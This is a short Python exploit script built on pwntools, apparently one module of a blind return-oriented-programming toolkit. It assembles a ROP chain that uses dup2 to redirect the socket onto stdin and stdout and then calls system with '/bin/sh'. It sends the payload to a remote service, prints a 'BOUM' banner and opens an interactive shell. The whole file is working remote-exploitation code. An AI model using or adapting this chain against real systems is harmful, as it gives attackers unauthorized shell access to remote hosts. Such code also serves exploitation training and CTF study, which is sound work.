#!/usr/bin/python3

from pwn import p64, u64

import print_tools as pt
import sys
import time


# SYNTAX COLOURS AND system DATA:

DODO = 0.06

def exploit(ExploitStructure):

	begin	= ExploitStructure.beginning()

	system	= ExploitStructure.system
	dup2	= ExploitStructure.dup2
	binsh	= ExploitStructure.binsh
	socket	= p64(0x4)

	brop7	= p64(u64(ExploitStructure.brop_gadget) + 0x7)	# rsi + r15
	brop9	= p64(u64(ExploitStructure.brop_gadget) + 0x9)	# rdi
	r15		= b'junkjunk'

	stdin	= p64(0x0)
	stdout	= p64(0x1)

	ropchain	= b''
	ropchain	+= brop9
	ropchain	+= socket
	ropchain	+= brop7
	ropchain	+= stdin
	ropchain	+= r15
	ropchain	+= dup2

	ropchain	+= brop9
	ropchain	+= socket
	ropchain	+= brop7
	ropchain	+= stdout
	ropchain	+= r15
	ropchain	+= dup2

	ropchain	+= brop9
	ropchain	+= binsh
	ropchain	+= system

	payload	= begin + ropchain

	r = ExploitStructure.remoteConnect()
	junk = r.recv()
	r.send(payload)
	time.sleep(DODO)

	print(pt.cjau + "Ba..." + pt.cend)
	time.sleep(0.5)
	print(pt.cjau + "...DA..." + pt.cend)
	time.sleep(0.5)
	print(pt.cred + "    /!\\" + pt.cend)
	print(pt.cred + "   /!!!\\" + pt.cend)
	print(pt.cred + "  /!\ /!\\" + pt.cend)
	print(pt.cred + " /!\   /!\\" + pt.cend)
	print(pt.cred + "/!\ BOUM /!\\" + pt.cend)
	print(pt.cred + "............." + pt.cend)
	print(pt.cred + " ..........." + pt.cend)
	print(pt.cred + "  ........." + pt.cend)
	print(pt.cred + "   ......." + pt.cend)
	print(pt.cred + "    ....." + pt.cend)
	time.sleep(0.5)

	# print(pt.ccya + "[o] Shell's coming..." + pt.cend)

	r.interactive()
